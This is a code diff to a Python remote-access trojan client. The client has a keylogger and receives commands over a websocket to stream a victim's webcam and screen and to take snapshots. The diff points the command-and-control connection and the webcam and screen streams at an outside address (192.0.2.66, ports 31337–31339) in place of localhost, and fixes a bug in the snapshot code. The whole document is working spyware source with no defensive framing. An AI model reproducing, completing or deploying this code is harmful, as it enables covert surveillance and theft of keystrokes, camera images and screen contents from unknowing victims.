@@ -63,7 +63,7 @@ async def client():
     global keylogger_file
     try:
         print("Trying to connect...")
-        async with websockets.connect('ws://127.0.0.1:8000') as websocket:
+        async with websockets.connect('ws://192.0.2.66:31337') as websocket:
             timestamp = str(datetime.now())
             print(f"Sending hello timestamp {timestamp}")
             await websocket.send(timestamp)
@@ -235,7 +235,7 @@ async def client():
 
                         if args[0] == "STREAM":
                             if not running_webcam:
-                                webcam = CameraClient("127.0.0.1", 8080)
+                                webcam = CameraClient("192.0.2.66", 31338)
                                 webcam.start_stream()
                                 running_webcam = True
                                 output.append(str("Streaming..."))
@@ -249,7 +249,7 @@ async def client():
                         elif args[0] == "SNAP":
                             if not running_webcam:
                                 webcam_snap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-                                return_value, cam_image = snap_cam.read()
+                                return_value, cam_image = webcam_snap.read()
                                 # convert from openCV2 to PIL. Notice the COLOR_BGR2RGB which means that
                                 # the color is converted from BGR to RGB
                                 image = Image.fromarray(cv2.cvtColor(webcam_snap, cv2.COLOR_BGR2RGB))
@@ -273,7 +273,7 @@ async def client():
 
                         if args[0] == "STREAM":
                             if not running_screenshare:
-                                screencam = ScreenShareClient("127.0.0.1", 8081)
+                                screencam = ScreenShareClient("192.0.2.66", 31339)
                                 screencam.start_stream()
                                 running_screenshare = True
                                 output.append(str("Streaming..."))
@@ -410,6 +410,6 @@ while True:
     running_webcam=False
     running_screenshare=False
 
-
     keylogger_file = tempfile.gettempdir() + "\logging.txt"
+
     asyncio.get_event_loop().run_until_complete(client())
